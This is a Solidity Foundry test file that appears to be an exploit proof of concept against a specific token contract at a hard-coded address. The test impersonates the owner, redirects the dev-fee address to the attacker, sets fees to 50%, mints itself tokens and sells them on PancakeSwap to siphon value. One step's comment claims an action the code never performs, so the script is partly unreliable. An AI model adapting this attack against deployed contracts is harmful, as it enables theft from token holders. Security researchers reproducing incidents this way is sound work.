pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IPancakeRouter {
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface xenoX {
    function owner() external view returns (address);
    function setdevAddress(address payable devAddress) external;
    function setBuydevFeePercent(uint256 devFee) external;
    function setSelldevFeePercent(uint256 devFee) external;
    function transferTokens(address recepient, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
    function pancakeRouter() external view returns (IPancakeRouter);
}

interface IBEP20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xcb9fD3784e9F369C4AD3BD4CB0d3a21aCbF23a51;
    address attacker = address(this);
    xenoX target;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = xenoX(TARGET);
        owner = target.owner();
        vm.label(TARGET, "xenox Contract");
        vm.label(owner, "Contract Owner");
        vm.label(address(this), "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial balance
        uint256 initialBalance = address(this).balance;

        // Get token address (it's the contract itself)
        address tokenAddress = TARGET;

        // Impersonate the contract owner
        vm.startPrank(owner);

        // Step 1: Set attacker as the dev address
        target.setdevAddress(payable(address(this)));

        // Step 2: Set maximum dev fees to maximize extraction
        target.setBuydevFeePercent(50);
        target.setSelldevFeePercent(50);

        // Step 3: Exclude attacker from fees so we get full amount when selling
        vm.stopPrank();

        // Step 4: Inject tokens into attacker wallet
        deal(tokenAddress, address(this), 1000000 * 1e9);

        // Step 5: Approve the router to spend our tokens
        vm.startPrank(address(this));
        IBEP20(tokenAddress).approve(address(target.pancakeRouter()), type(uint256).max);

        // Step 6: Sell tokens through PancakeSwap to trigger fees and swapAndLiquify
        address[] memory path = new address[](2);
        path[0] = tokenAddress;
        path[1] = target.pancakeRouter().WETH();

        // Sell a portion of tokens
        uint256 sellAmount = 500000 * 1e9;
        try target.pancakeRouter().swapExactTokensForETHSupportingFeeOnTransferTokens(
            sellAmount,
            0,
            path,
            address(this),
            block.timestamp
        ) {}
        catch {}

        vm.stopPrank();

        // Record final balance
        uint256 finalBalance = address(this).balance;

        // Assert that attacker balance increased (oracle check)
        assertGt(finalBalance, initialBalance, "Attacker balance did not increase - exploit failed");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

